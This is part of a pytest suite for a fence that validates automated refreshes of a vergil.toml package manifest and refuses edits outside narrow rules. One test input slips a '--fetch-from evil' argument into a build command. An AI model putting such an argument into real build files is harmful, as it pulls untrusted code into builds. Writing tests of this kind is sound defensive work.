    after = _PY_TOML + _PY_315.replace("build.sh 3.15", "build.sh 3.15 --fetch-from evil")
    violations = _toml_fence(tmp_path, after)
    assert violations == [
        "vergil.toml: refused, new [[package]] 'vergil-python3.15': staged is not "
        "'vergil-python3.14''s with 3.14 replaced by 3.15 (a new entry must be a series copy)"
    ]


def test_fence_vergil_toml_new_entry_extra_key_refused(tmp_path: Path) -> None:
    after = _PY_TOML + _PY_315.replace(
        'builder = "staged"\n', 'builder = "staged"\nnative = true\n'
    )
    violations = _toml_fence(tmp_path, after)
    assert len(violations) == 1
    assert "'vergil-python3.15': native is not" in violations[0]


@pytest.mark.parametrize(
    "name", ["evil-tool3.15", "other-vergil-python3.15", "vergil-python", "vergil-python3"]
)
def test_fence_vergil_toml_new_entry_unrelated_name_refused(tmp_path: Path, name: str) -> None:
    after = _PY_TOML + _PY_315.replace('name = "vergil-python3.15"', f'name = "{name}"')
    assert _toml_fence(tmp_path, after) == [
        f"vergil.toml: refused, new [[package]] {name!r} is not a series copy: its name "
        r"differs from every existing entry's by more than one \d+\.\d+ series token"
    ]


def test_fence_vergil_toml_series_copy_reports_closest_candidate(tmp_path: Path) -> None:
    py313 = _PY_315.replace("3.15", "3.13").replace("+20261102", "+20261026")
    before = _PY_TOML + py313
    after = before + _PY_315.replace("import sys'", "import os'")
    violations = _toml_fence(tmp_path, after, before=before)
    assert violations == [
        "vergil.toml: refused, new [[package]] 'vergil-python3.15': smoke is not "
        "'vergil-python3.14''s with 3.14 replaced by 3.15 (a new entry must be a series copy)"
    ]


@pytest.mark.parametrize(
    ("before_extra", "after_extra"),
    [("", '\npackage = "x"\n'), ('\npackage = ["x"]\n', "")],
)
def test_fence_vergil_toml_malformed_package_refused(
    tmp_path: Path, before_extra: str, after_extra: str
) -> None:
    head = _PY_TOML.split("[[package]]")[0]
    violations = _toml_fence(tmp_path, after_extra + head, before=before_extra + head)
    assert violations == ["vergil.toml: refused, [[package]] must be a table or an array of tables"]


def test_fence_vergil_toml_single_package_table(tmp_path: Path) -> None:
    single = _PY_TOML.replace("[[package]]", "[package]")
    after = single.replace("3.14.10+20261026", "3.14.11+20261102")
    assert _toml_fence(tmp_path, after, before=single) == []
    assert _toml_fence(
        tmp_path / "s", after.replace("noarch = false", "noarch = true"), before=single
    ) == [
        "vergil.toml: refused, [[package]] 'vergil-python3.14': noarch changed; only "
        "upstream-version and summary may change"
    ]


def test_fence_vergil_toml_new_entry_bad_upstream_version_refused(tmp_path: Path) -> None:
    after = _PY_TOML + _PY_315.replace("3.15.0+20261102", "3.15.0+x")
    violations = _toml_fence(tmp_path, after)
    assert len(violations) == 1
    assert "'vergil-python3.15': upstream-version '3.15.0+x' does not match" in violations[0]


def test_fence_vergil_toml_removed_package_allowed(tmp_path: Path) -> None:
    assert _toml_fence(tmp_path, _PY_TOML, before=_PY_TOML + _PY_315) == []


def test_fence_vergil_toml_dependencies_change_refused(tmp_path: Path) -> None:
    after = _PY_TOML.replace('vergil = "v2.1"', 'vergil = "v9.9"').replace(
        "3.14.10+20261026", "3.14.11+20261102"
    )
    assert _toml_fence(tmp_path, after) == [
        "vergil.toml: refused, [dependencies] changed; outside [[package]] nothing may change"
    ]


def test_fence_vergil_toml_upstream_refresh_change_refused(tmp_path: Path) -> None:
    after = _PY_TOML.replace('paths = ["vergil.toml", "runtime.toml"]', 'paths = ["**"]')
    assert _toml_fence(tmp_path, after) == [
        "vergil.toml: refused, [upstream-refresh] changed; outside [[package]] nothing may change"
    ]


def test_fence_vergil_toml_unparseable_refused(tmp_path: Path) -> None:
    violations = _toml_fence(tmp_path, _PY_TOML + "\n[broken\n")
    assert len(violations) == 1
    assert violations[0].startswith("vergil.toml: refused, it does not parse after the patch")


def test_fence_vergil_toml_unnamed_entries_refused(tmp_path: Path) -> None:
    after = _PY_TOML.replace('name = "vergil-python3.14"\n', "").replace(
        "3.14.10+20261026", "3.14.11+20261102"
    )
    violations = _toml_fence(tmp_path, after)
    assert violations == [
        "vergil.toml: refused, every [[package]] entry must have a unique string name for the "
        "fence to match it"
    ]


def test_fence_vergil_toml_added_or_deleted_refused() -> None:
    lines = [
        "diff --git a/vergil.toml b/vergil.toml",
        "deleted file mode 100644",
        "@@ -1 +0,0 @@",
        "-x",
    ]
    violations = fence_violations(
        _rules("vergil.toml"), ["vergil.toml"], {"vergil.toml": lines}, "x", None
    )
    assert violations == ["vergil.toml: refused, a refresh may edit it but never add or delete it"]


# -- failure paths -------------------------------------------------------------


def test_git_failure_names_the_command(tmp_path: Path) -> None:
    with pytest.raises(UpstreamRefreshError, match=r"git diff failed in .* \(exit \d+\)"):
        diff_changed_lines(tmp_path, _SHA, ["a.txt"])


def test_prepare_refuses_non_utf8_path(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    _origin(tmp_path, monkeypatch, "touch \"$(printf '\\377')\"")
    with pytest.raises(UpstreamRefreshError, match="has a path that is not UTF-8"):
        prepare(_REPO, tmp_path / "out")


def test_fence_refuses_path_with_line_break() -> None:
    violations = fence_violations(_rules("**"), ["a\nb"], {"a\nb": ["@@"]}, None, None)
    assert violations == ["'a\\nb': refused, the path contains a NUL or line break"]


def test_fence_line_rule_refuses_mode_change(tmp_path: Path) -> None:
    tree = tmp_path / "t"
    tree.mkdir()
    _git(tree, "init", "-q")
    (tree / "f").write_text("ARG X_VERSION=1\n")
    _git(tree, "add", "-A")
    _git(tree, "commit", "-qm", "base")
    base = _git(tree, "rev-parse", "HEAD")
    (tree / "f").chmod(0o755)
    _git(tree, "add", "-A")
    rule = PathRule(glob="f", lines=_FRAGMENT_RULE)
    violations = fence_violations(
        _rules(rule), ["f"], diff_changed_lines(tree, base, ["f"]), None, None
    )
    assert violations == [
        "f: refused by the line rule of paths entry 'f': a mode change is not allowed under a "
        "line rule"
    ]
